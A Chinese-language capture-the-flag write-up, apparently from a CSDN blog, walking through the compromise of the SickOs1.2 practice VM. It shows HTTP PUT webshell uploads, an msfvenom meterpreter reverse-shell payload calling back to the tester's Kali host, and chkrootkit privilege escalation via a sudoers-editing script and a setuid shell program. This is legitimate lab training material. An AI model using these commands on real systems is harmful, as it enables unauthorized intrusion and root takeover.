@@ -1,0 +1,260 @@
+一. 实验环境
+靶机：SickOs1.2，IP地址暂时未知；
+测试机：Kali，IP地址：192.168.37.131；
+测试机：物理机win7；
+二. 实验流程
+信息收集——主机发现
+信息收集——端口扫描
+渗透测试
+三. 实验步骤
+（一）信息收集——主机发现
+1. 查看Kali的IP信息；（IP：192.168.37.131）
+
+
+2. 查看靶机页面
+
+
+3. 扫描主机（netdiscover）
+netdiscover -i eth0 -r 192.168.37.0/24
+
+Netdiscover： -i 指定网卡 -r 指定网段
+
+
+
+（二）信息收集——端口扫描
+1. 扫描端口（masscan）
+masscan --rate=10000 --ports 0-65535 192.168.37.150
+
+
+
+扫描发现目标开放了22,80端口；
+
+2. 详细扫描端口信息（nmap）
+nmap -T4 -sV -O -p 22,80 192.168.37.150
+
+
+
+22（ssh），80（http）；
+
+（三）渗透测试
+80端口（http服务）
+1. 访问目标靶机的80端口
+查看http服务首页信息；http://192.168.37.150
+
+
+
+没有发现什么可以利用的信息；
+
+2. 网站目录扫描（dirb）
+dirb http://192.168.37.150
+
+
+
+3. 查看扫描到的网站目录
+3.1> http://192.168.37.150/index.php
+
+
+
+3.2> http://192.168.37.150/test/
+
+
+
+可以看到，/test目录下有很多文件可以访问，那是否能上传文件到这里呢？但是在这个页面没有直接上传的入口；
+注：如果该页面支持http的put方法，就可以间接性的上传文件；
+4. 查看/test/目录支持的方法
+对/test/目录OPTIONS一下，查看它支持什么方法，如果支持PUT方法，我们就可以上传文件了。
+
+
+
+当然也可以用curl -X OPTIONS "http://192.168.37.150/test/"）；
+
+
+
+支持PUT方法，可以上传文件；
+
+5. 上传一句话木马，获取webshell
+5.1> 上传一句话木马
+
+
+
+
+
+上传成功；
+注：如果上传的文件存在，在返回的状态码是200，否则是201；
+5.2> 使用中国菜刀进行连接；
+
+
+
+
+
+成功获取了webshell；
+
+6. 上传文件，获取反弹shell
+6.1> 上传文件1.php；
+
+将Kali上的php-reverse-shell.php复制到物理机上，重命名为1.php，并修改监听的IP地址和端口；
+
+IP：192.168.37.131
+
+Port：443（注：换成其他高位端口不能监听成功，防火墙过滤掉了）
+
+
+
+
+
+
+
+6.2> 上传成功；
+
+
+
+6.3> 在Kali上监听443端口；再点击上传成功的1.php文件，成功获取到shell；
+
+
+
+
+
+7. 方式2获取shell：Msfvenom生成payload
+7.1> 上传一个精心构造的php webshell，使用msfvenom生成payload;
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.37.131 LPORT=55555 > shell_55555.php
+
+
+
+7.2> 将shell_55555上传到靶机的test目录下；
+
+curl -v -T shell_55555.php "http://192.168.37.150/test/"
+
+
+
+没有上传成功，出现了417错误——预期结果错误；
+
+7.3> 解决出现的417错误；
+
+在curl的参数中加上一个特定的HTTP Header Expect:，即将Header中Expect的值手动指定为空。
+
+curl -v -H "Expect:" -T shell_55555.php http://192.168.37.150/test/
+
+
+
+
+
+7.4> 在Kali测试机上打开msfconsole，exploit/multi/handler模块，指定IP和端口进行监听，然后放到后台。 
+
+
+
+
+
+7.5> 使用curl访问上传到靶机上的shell_55555.php文件后，没有什么反应；
+
+
+
+
+
+可能是防火墙过滤掉了非常用端口的流量；
+
+7.6> 修改监听的端口，设置为443
+
+
+
+
+
+7.7> 访问靶机上的shell_443.php
+
+
+
+7.8> 即可触发服务器端反弹TCP的操作, 在msfconsole里就会得到一个meterpreter的shell。
+
+
+
+7.8> 在meterpreter中用shell命令来得到一个交互式的shell，但是并没有tty,需要用python生成一个bash。 
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+获取了普通用户的权限，接下来就示提权操作；
+
+8. 提权
+8.1> 查看靶机服务器和版本信息；
+
+ 
+
+8.2> 扫描版本的漏洞
+
+
+
+
+
+
+
+可以看到chkrootkit存在本地提权漏洞；
+
+8.3> 方法一：添加当前用户www-data到sudoers列表中
+
+新建一个文件update
+
+
+
+给update文件添加执行权限；
+
+
+
+添加当前用户www-data到sudoers列表中；
+
+echo 'chmod +w /etc/sudoers && echo "www-data ALL=(ALL)NOPASSWD:ALL" >> /etc/sudoers' > /tmp/update
+
+
+
+8.4> 方法二：创建shell.c文件
+
+在Kali上编写shell.c文件
+
+#include<unistd.h>
+
+void main(void)
+
+{
+
+system("chown root:root /tmp/update");
+
+system("chmod 4755 /tmp/update");
+
+setuid(0);
+
+setgid(0);
+
+execl("/bin/sh","sh",NULL);
+
+}
+
+
+
+将shell.c文件上传到靶机上
+
+curl -v -H "Expect:" -T shell.c http://192.168.37.150/test/
+
+
+
+
+
+
+
+
+
+四. 防火墙规则
+
+
+对于入站流量：只接受目的端口是22、80，源端口是8080、443的流量；
+对于出站流量：只接受源端口是22、80，目的端口是8080、443的流量；
+所以，本地端口只接受22和80端口的流量，外来端口只接受8080和443端口的流量，这也就是为什么前面使用443端口监听成功的原因。
+
+五. 实验总结
+如果某个网站目录下有很多文件可以访问，那是否能上传文件到这里呢，可以猜想是否具有文件上传漏洞；
+如果某页面支持http的put方法，就可以间接性的上传文件；
+如果高位端口不能监听到信息，可以尝试监听443端口，因为防火墙可能会过滤掉非常用端口的流量；
+--------------------- 
+作者：橘子女侠 
+来源：CSDN 
+原文：https://blog.csdn.net/qq_38684504/article/details/90108014 
+版权声明：本文为博主原创文章，转载请附上博文链接！
